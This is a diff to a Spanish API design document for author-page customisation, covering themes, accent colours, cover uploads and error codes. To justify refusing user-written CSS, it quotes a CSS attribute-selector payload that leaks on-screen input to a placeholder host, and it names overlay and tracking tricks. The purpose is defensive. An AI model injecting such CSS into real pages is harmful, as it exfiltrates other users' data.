@@ -72,6 +72,10 @@
 | `GET /api/v1/users/{userId}/share` | `getProfileShareCard` | Cómo se ve el perfil compartido fuera | FEAT-USR-032 | **Implementado** |
 | `GET /api/v1/me/appearance-settings` | `getMyAppearanceSettings` | Mi tema | FEAT-USR-042 | **Implementado** |
 | `PUT /api/v1/me/appearance-settings` | `updateMyAppearanceSettings` | Cambiarlo | FEAT-USR-042 | **Implementado** |
+| `GET /api/v1/me/author-page-style` | `getMyAuthorPageStyle` | Cómo se ve mi página de autor | FEAT-USR-016 | **Implementado** |
+| `PUT /api/v1/me/author-page-style` | `updateMyAuthorPageStyle` | Elegir tema y color | FEAT-USR-016 | **Implementado** |
+| `PUT /api/v1/me/profile/cover` | `updateProfileCover` | Subir el fondo | FEAT-USR-016 | **Implementado** |
+| `DELETE /api/v1/me/profile/cover` | `deleteProfileCover` | Quitarlo | FEAT-USR-016 | **Implementado** |
 | `GET /api/v1/authors` | `searchAuthors` | Buscar personas por nombre o temática | FEAT-USR-017 | **Implementado** |
 | `PUT /api/v1/me/author-links` | `updateAuthorLinks` | Las referencias de la página de autor | FEAT-USR-015 | **Implementado** |
 | `PUT /me/author-page/theme` | `updateAuthorPageTheme` | Personalización visual | FEAT-USR-016 | PENDING |
@@ -1241,3 +1245,79 @@ y la ven los demás; esta la elige cada quien y solo la ve él.
   `oscuro` cree que ha cambiado algo.
 - **No hace falta la cuenta activada.** Es una preferencia de pantalla.
 - No publica eventos.
+
+---
+
+## Personalizar la página de autor
+
+**Funcionalidad:** [`FEAT-USR-016`](../../features/user/FEAT-USR-016-customise-the-author-page.md)
+
+Un tema, un color de acento y una imagen de fondo, sobre la página de autor — que **es el
+perfil** (`P-5`).
+
+### Catálogo cerrado, nunca CSS
+
+Es la decisión de `U-5`, y conviene leerla antes que el resto porque «dejar que cada uno escriba
+su CSS» suena a libertad y es otra cosa. **CSS escrito por un usuario y servido a terceros es
+código ejecutándose en la página de quien mira:**
+
+| Qué permite | Cómo |
+|---|---|
+| **Exfiltrar datos** | `input[value^="a"] { background: url(https://donde-sea/a) }` lee letra a letra lo que hay en la pantalla de otro |
+| **Superponer** | `position` y `z-index` colocan un botón falso sobre uno real |
+| **Rastrear** | `@import` y `url()` convierten cada visita en una petición a un servidor de terceros |
+
+Sanear eso exige un parser de CSS con lista blanca de propiedades, y es una defensa frágil: cada
+versión del navegador trae una propiedad nueva y la lista se queda corta en silencio. **Un enum
+no tiene ese problema.**
+
+Por lo mismo, el color **no acepta un hexadecimal**: un color libre acaba interpolado en un
+atributo `style`, y ahí una cadena que no sea un color es una inyección por la puerta de atrás.
+
+`theme`: `CLASSIC`, `INK`, `PARCHMENT`, `MIDNIGHT`, `LINEN`, `BOTANICAL`.
+`accentColour`: `SLATE`, `CRIMSON`, `AMBER`, `FOREST`, `OCEAN`, `PLUM`.
+
+**No hay endpoint de catálogo**: son dos listas cerradas que la pantalla conoce, y pedirlas antes
+de pintar seis botones sería una petición de más. Los valores válidos están en OpenAPI.
+
+### El fondo es la portada del perfil, que ya existía
+
+`User` tenía `coverUrl` y `updateCover` desde `FEAT-USR-014` y **nunca tuvo endpoint**. Esto no
+inventa una imagen nueva: le pone la puerta que le faltaba, y de paso `coverUrl` pasa por
+`MediaUrl` como el avatar.
+
+Le aplican las reglas de [`file-uploads.md`](../conventions/file-uploads.md): la imagen se
+reescribe siempre —una foto de fondo puede llevar las coordenadas de dónde se tomó—, el límite
+(4 MB) lo aplica el servidor, y lo que se sustituye se borra.
+
+Lo que **no** hereda del avatar es el recorte: un fondo es un banner y su proporción la decide la
+pantalla. Solo se acota el lado mayor, a 1600 px.
+
+`covers/` se añade a las carpetas públicas de `GET /media/{key}`, con la misma decisión consciente
+que `book-covers`.
+
+### No es `FEAT-USR-042`
+
+| | `FEAT-USR-016` | `FEAT-USR-042` |
+|---|---|---|
+| Quién lo elige | El autor | Cada quien |
+| Quién lo ve | Los demás | Solo él |
+| Qué pinta | Su página de autor | Toda la aplicación |
+| Dónde viaja | En el perfil público | En el contexto de sesión |
+
+### Errores específicos
+
+| `code` | HTTP | Cuándo |
+|---|---|---|
+| `UNKNOWN_AUTHOR_PAGE_THEME` | 422 | Un tema que no está en el catálogo |
+| `UNKNOWN_ACCENT_COLOUR` | 422 | Un color que no está en la paleta, incluido un hexadecimal |
+| `COVER_REQUIRED` | 422 | No se mandó imagen |
+| `UNSUPPORTED_COVER_TYPE` | 422 | No es una imagen |
+| `UNREADABLE_COVER` | 422 | Es una imagen que no se puede leer |
+| `COVER_TOO_LARGE` | 413 | Más de 4 MB |
+
+Los tres del fichero se distinguen a propósito: llevan a acciones distintas.
+
+### Efectos
+
+Ninguno. No publica eventos: a nadie fuera de `User` le importa el color de una página.
